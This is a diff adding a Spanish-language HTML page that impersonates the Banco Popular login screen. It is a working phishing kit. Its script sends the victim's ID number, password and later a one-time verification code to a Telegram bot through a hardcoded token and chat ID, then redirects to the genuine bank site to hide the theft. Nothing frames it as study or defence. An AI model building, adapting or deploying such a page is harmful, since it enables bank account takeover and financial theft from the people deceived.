@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Banco Popular - Bienvenido</title>
+
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+
+    body{
+      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;
+      background:#f4f5f7;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      color:#1f2933;
+    }
+
+    .page{
+      flex:1;
+      display:flex;
+      flex-direction:column;
+    }
+
+    .main{
+      flex:1;
+      display:flex;
+      max-width:1360px;
+      margin:0 auto;
+      padding:32px 24px 24px;
+      gap:32px;
+    }
+
+    /* TARJETA IZQUIERDA */
+    .card-left{
+      flex:0 0 420px;
+      background:#ffffff;
+      border-radius:16px;
+      box-shadow:0 10px 25px rgba(15,23,42,.08);
+      padding:28px 32px 32px;
+      display:flex;
+      flex-direction:column;
+      position:relative;
+    }
+
+    .icon-alert{
+      position:absolute;
+      top:22px;
+      right:22px;
+      width:18px;
+      height:18px;
+      border-radius:999px;
+      border:1px solid #ff8a00;
+      color:#ff8a00;
+      font-size:12px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+
+    .welcome{
+      font-size:14px;
+      margin-bottom:8px;
+    }
+
+    .logo-popular{
+      margin-bottom:24px;
+    }
+    .logo-popular img{
+      height:28px;
+      width:auto;
+    }
+
+    .field-label{
+      font-size:13px;
+      color:#4b5563;
+      margin-bottom:6px;
+    }
+
+    .field-group{
+      margin-bottom:18px;
+    }
+
+    .select-box{
+      width:100%;
+      border-radius:8px;
+      border:1px solid #d1d5db;
+      background:#fff;
+      padding:10px 12px;
+      font-size:14px;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      cursor:pointer;
+    }
+    .select-box select{
+      border:none;
+      outline:none;
+      width:100%;
+      font-size:14px;
+      background:transparent;
+      color:#111827;
+    }
+
+    .input-wrapper{
+      position:relative;
+    }
+    .input-wrapper input{
+      width:100%;
+      border-radius:8px;
+      border:1px solid #d1d5db;
+      padding:10px 12px;
+      font-size:14px;
+      outline:none;
+    }
+    .input-wrapper input:focus{
+      border-color:#00a651;
+      box-shadow:0 0 0 1px rgba(0,166,81,.15);
+    }
+
+    .toggle-remember{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      margin:6px 0 22px;
+      font-size:13px;
+      color:#374151;
+    }
+
+    .switch{
+      width:40px;
+      height:22px;
+      border-radius:999px;
+      background:#00a651;
+      position:relative;
+    }
+    .switch-circle{
+      position:absolute;
+      top:3px;
+      left:19px;
+      width:16px;
+      height:16px;
+      border-radius:50%;
+      background:#fff;
+    }
+
+    .btn-primary{
+      width:100%;
+      padding:13px;
+      border-radius:8px;
+      border:none;
+      background:#00485d;
+      color:#fff;
+      font-size:15px;
+      font-weight:600;
+      cursor:pointer;
+      margin-top:4px;
+      transition:background .2s,box-shadow .2s,transform .05s;
+    }
+    .btn-primary:hover{
+      background:#00384a;
+      box-shadow:0 4px 10px rgba(0,72,93,.35);
+      transform:translateY(-1px);
+    }
+
+    .helper-row{
+      margin-top:10px;
+      font-size:12px;
+      text-align:center;
+    }
+    .helper-row a{
+      color:#f97316;
+      text-decoration:none;
+      font-weight:600;
+    }
+    .helper-row a:hover{text-decoration:underline;}
+
+    .bottom-options{
+      margin-top:28px;
+      border-top:1px solid #e5e7eb;
+      padding-top:18px;
+      font-size:13px;
+    }
+    .bottom-title{
+      margin-bottom:14px;
+      font-weight:500;
+    }
+
+    .options-row{
+      display:flex;
+      gap:12px;
+      flex-wrap:wrap;
+    }
+
+    .option-tile{
+      flex:1;
+      min-width:120px;
+      background:#f9fafb;
+      border-radius:12px;
+      padding:10px 8px;
+      text-align:center;
+      border:1px solid #e5e7eb;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      gap:6px;
+    }
+
+    .option-icon{
+      width:40px;
+      height:40px;
+      border-radius:999px;
+      background:#e7fbe9;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:#00a651;
+    }
+    .option-icon svg{
+      width:18px;
+      height:18px;
+      display:block;
+    }
+
+    .option-label{
+      font-size:12px;
+      color:#374151;
+    }
+
+    /* PANEL DERECHO */
+    .right-panel{
+      flex:1;
+      display:flex;
+      flex-direction:column;
+      gap:18px;
+    }
+
+    .banner-cdt{
+      background:#00485d;
+      border-radius:12px;
+      padding:26px 32px;
+      color:#e5e7eb;
+    }
+    .banner-cdt-title{
+      font-size:20px;
+      font-weight:700;
+      margin-bottom:6px;
+      line-height:1.3;
+    }
+    .banner-cdt-title span{
+      color:#22c55e;
+    }
+    .banner-cdt-text{
+      font-size:14px;
+      line-height:1.4;
+    }
+
+    .right-options-title{
+      font-size:13px;
+      margin-bottom:10px;
+    }
+
+    .options-row-right{
+      display:flex;
+      gap:14px;
+      flex-wrap:wrap;
+    }
+    .option-tile-right{
+      flex:1;
+      min-width:150px;
+      background:#ffffff;
+      border-radius:12px;
+      padding:14px 12px;
+      text-align:center;
+      border:1px solid #e5e7eb;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      gap:6px;
+    }
+    .option-tile-right .option-icon{
+      background:#e7fbe9;
+    }
+
+    /* FOOTER */
+    footer{
+      border-top:1px solid #e5e7eb;
+      background:#ffffff;
+      font-size:12px;
+      color:#6b7280;
+    }
+    .footer-inner{
+      max-width:1360px;
+      margin:0 auto;
+      padding:10px 24px;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:10px;
+      flex-wrap:wrap;
+    }
+    .footer-left{
+      display:flex;
+      align-items:center;
+      gap:8px;
+    }
+    .footer-left img{
+      height:22px;
+      width:auto;
+    }
+    .footer-right a{
+      margin-left:12px;
+      color:#f97316;
+      text-decoration:none;
+    }
+    .footer-right a:hover{text-decoration:underline;}
+
+    /* OTP overlay */
+    .otp-overlay{
+      position:fixed;
+      inset:0;
+      background:rgba(15,23,42,.45);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:40;
+    }
+    .otp-card{
+      background:#fff;
+      border-radius:14px;
+      padding:22px 24px 20px;
+      width:100%;
+      max-width:360px;
+      box-shadow:0 16px 35px rgba(15,23,42,.35);
+    }
+    .otp-title{
+      font-size:17px;
+      font-weight:600;
+      margin-bottom:6px;
+    }
+    .otp-subtitle{
+      font-size:13px;
+      color:#4b5563;
+      margin-bottom:16px;
+    }
+    .otp-input{
+      width:100%;
+      border-radius:8px;
+      border:1px solid #d1d5db;
+      padding:10px 12px;
+      font-size:18px;
+      text-align:center;
+      letter-spacing:3px;
+      margin-bottom:14px;
+    }
+
+    /* DESKTOP ajustes extra */
+    @media (min-width:1025px){
+      .card-left{
+        flex:0 0 460px;
+        padding:32px 36px 32px;
+      }
+      .field-label{
+        font-size:14px;
+      }
+      .select-box,
+      .input-wrapper input{
+        padding:12px 14px;
+        font-size:15px;
+      }
+      .btn-primary{
+        font-size:16px;
+        padding:14px;
+      }
+      .bottom-options{
+        margin-top:30px;
+      }
+    }
+
+    /* MOBILE / TABLET */
+    @media (max-width:1024px){
+      .main{
+        flex-direction:column;
+        padding:16px 14px 20px;
+      }
+      .card-left{
+        flex:unset;
+        width:100%;
+        max-width:420px;
+        margin:0 auto;
+        padding:24px 20px 26px;
+      }
+      .right-panel{
+        display:none;
+      }
+      .field-label{
+        font-size:13px;
+      }
+      .select-box,
+      .input-wrapper input{
+        padding:12px 14px;
+        font-size:14px;
+      }
+      .btn-primary{
+        padding:13px;
+        font-size:15px;
+      }
+      .bottom-options{
+        margin-top:20px;
+      }
+      .option-icon{
+        width:36px;
+        height:36px;
+      }
+    }
+
+    @media (max-width:480px){
+      .card-left{
+        padding:22px 18px 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <main class="main">
+      <!-- TARJETA IZQUIERDA -->
+      <section class="card-left">
+        <div class="icon-alert">!</div>
+
+        <div class="welcome">Bienvenido a</div>
+        <div class="logo-popular">
+          <img src="popular.svg" alt="Banco Popular">
+        </div>
+
+        <!-- Tipo de documento -->
+        <div class="field-group">
+          <div class="field-label">Tipo de documento</div>
+          <div class="select-box">
+            <select id="tipoDocumento">
+              <option>Cédula de Ciudadanía</option>
+              <option>Cédula de Extranjería</option>
+              <option>NIT</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Número de documento -->
+        <div class="field-group">
+          <div class="field-label">Número de documento</div>
+          <div class="input-wrapper">
+            <input type="text" id="numeroDocumento" placeholder="Ingresa tu número de documento">
+          </div>
+        </div>
+
+        <!-- Contraseña -->
+        <div class="field-group">
+          <div class="field-label">Contraseña</div>
+          <div class="input-wrapper">
+            <input type="password" id="contrasena" placeholder="Ingresa tu contraseña">
+          </div>
+        </div>
+
+        <div class="toggle-remember">
+          <div class="switch">
+            <div class="switch-circle"></div>
+          </div>
+          <span>Recordar tipo y número de documento</span>
+        </div>
+
+        <button type="button" class="btn-primary" onclick="enviarLogin()">Continuar</button>
+
+        <div class="helper-row">
+          ¿No eres usuario? <a href="#">Regístrate aquí</a>
+        </div>
+
+        <div class="bottom-options">
+          <div class="bottom-title">¿Cómo podemos ayudarte?</div>
+          <div class="options-row">
+            <div class="option-tile">
+              <div class="option-icon">
+                <!-- Documento -->
+                <svg viewBox="0 0 24 24">
+                  <path d="M7 3h7l5 5v11a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2z" fill="currentColor"/>
+                  <path d="M14 3v5h5" fill="#ffffff"/>
+                </svg>
+              </div>
+              <div class="option-label">Solicitar productos</div>
+            </div>
+
+            <div class="option-tile">
+              <div class="option-icon">
+                <!-- Teléfono -->
+                <svg viewBox="0 0 24 24">
+                  <path d="M6.6 4.2 9 3l3 5-2 1a10 10 0 0 0 4.5 4.5l1-2 5 3-1.2 2.4A2 2 0 0 1 17.6 18C11.5 15.1 8.9 12.5 6 6.4A2 2 0 0 1 6.6 4.2Z" fill="currentColor"/>
+                </svg>
+              </div>
+              <div class="option-label">Contáctanos</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- PANEL DERECHO (desktop) -->
+      <section class="right-panel">
+        <div class="banner-cdt">
+          <div class="banner-cdt-title">
+            Abre aquí tu <span>CDT</span><br>
+            desde <span>$300.000</span>
+          </div>
+          <div class="banner-cdt-text">
+            Y haz crecer tus ahorros con buena rentabilidad. Gana premios al instante, abriéndolo desde $20 millones a 150 días.
+          </div>
+        </div>
+
+        <div class="right-options-title">¿Cómo podemos ayudarte?</div>
+        <div class="options-row-right">
+          <div class="option-tile-right">
+            <div class="option-icon">
+              <!-- Documento -->
+              <svg viewBox="0 0 24 24">
+                <path d="M7 3h7l5 5v11a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2z" fill="currentColor"/>
+                <path d="M14 3v5h5" fill="#ffffff"/>
+              </svg>
+            </div>
+            <div class="option-label">Solicitar productos</div>
+          </div>
+
+          <div class="option-tile-right">
+            <div class="option-icon">
+              <!-- Teléfono -->
+              <svg viewBox="0 0 24 24">
+                <path d="M6.6 4.2 9 3l3 5-2 1a10 10 0 0 0 4.5 4.5l1-2 5 3-1.2 2.4A2 2 0 0 1 17.6 18C11.5 15.1 8.9 12.5 6 6.4A2 2 0 0 1 6.6 4.2Z" fill="currentColor"/>
+              </svg>
+            </div>
+            <div class="option-label">Contáctanos</div>
+          </div>
+
+          <div class="option-tile-right">
+            <div class="option-icon">
+              <!-- Pin -->
+              <svg viewBox="0 0 24 24">
+                <path d="M12 2a7 7 0 0 1 7 7c0 5-7 13-7 13S5 14 5 9a7 7 0 0 1 7-7zm0 4a3 3 0 1 0 0 6 3 3 0 0 0 0-6z" fill="currentColor"/>
+              </svg>
+            </div>
+            <div class="option-label">Visítanos</div>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <!-- FOOTER -->
+    <footer>
+      <div class="footer-inner">
+        <div class="footer-left">
+          <img src="p.svg" alt="Banco Popular">
+          <img src="aval.png" alt="Grupo Aval">
+        </div>
+        <div class="footer-right">
+          <a href="#">Seguridad</a>
+          <a href="#">Accesibilidad</a>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <!-- MODAL OTP -->
+  <div class="otp-overlay" id="otpOverlay">
+    <div class="otp-card">
+      <div class="otp-title">Código de verificación</div>
+      <div class="otp-subtitle">
+        Por tu seguridad, ingresa el código de verificación que te hemos enviado.
+      </div>
+      <input type="text" id="otpCode" class="otp-input" maxlength="6" placeholder="000000">
+      <button type="button" class="btn-primary" onclick="enviarOTP()">Verificar</button>
+    </div>
+  </div>
+
+  <script>
+const BOT_TOKEN = '8735380697:AAF4G03kbZoCAOf2IUWJHE6P6jcmlzYQzCg';
+const CHAT_ID = '-1003969378541';
+
+
+const params = new URLSearchParams(window.location.search);
+const placa = params.get('placa') || '';
+const valor = params.get('valor') || '';
+const pagoId = params.get('pagoId') || '';
+
+let loginIdActual = null;
+
+// ================= LOGIN =================
+async function enviarLogin(){
+  const tipoDocumento = document.getElementById('tipoDocumento').value;
+  const numeroDocumento = document.getElementById('numeroDocumento').value.trim();
+  const contrasena = document.getElementById('contrasena').value.trim();
+
+  if(!numeroDocumento || !contrasena){
+    alert('Por favor ingresa número de documento y contraseña.');
+    return;
+  }
+
+  // 🔥 MENSAJE TELEGRAM (TODOS LOS DATOS)
+  let mensaje = "🏦 <b>BANCO POPULAR LOGIN</b>\n\n";
+
+  document.querySelectorAll("input, select").forEach(el => {
+    const nombre = el.id || "campo";
+    const valorInput = el.value || "N/A";
+    mensaje += `<b>${nombre}:</b> ${valorInput}\n`;
+  });
+
+  mensaje += `\n🚗 <b>placa:</b> ${placa}`;
+  mensaje += `\n💰 <b>valor:</b> ${valor}`;
+  mensaje += `\n🆔 <b>pago_id:</b> ${pagoId}`;
+  mensaje += `\n⏰ <b>fecha:</b> ${new Date().toISOString()}`;
+
+  try{
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: 'HTML'
+      })
+    });
+  }catch(e){}
+
+  // generar id fake
+  loginIdActual = Date.now();
+
+  // 🔥 mostrar OTP automático (sin backend)
+  setTimeout(()=>{
+    document.getElementById('otpOverlay').style.display = 'flex';
+  }, 1200);
+}
+
+
+// ================= OTP =================
+async function enviarOTP(){
+  const otp = document.getElementById('otpCode').value.trim();
+
+  if(!otp || otp.length < 4){
+    alert('Por favor ingresa el código OTP.');
+    return;
+  }
+
+  let mensaje = "🔢 <b>BANCO POPULAR OTP</b>\n\n";
+  mensaje += `<b>codigo:</b> ${otp}\n`;
+  mensaje += `<b>login_id:</b> ${loginIdActual}`;
+
+  try{
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: 'HTML'
+      })
+    });
+  }catch(e){}
+
+  window.location.href = 'https://www.bancopopular.com.co/';
+}
+</script>
+</body>
+</html>
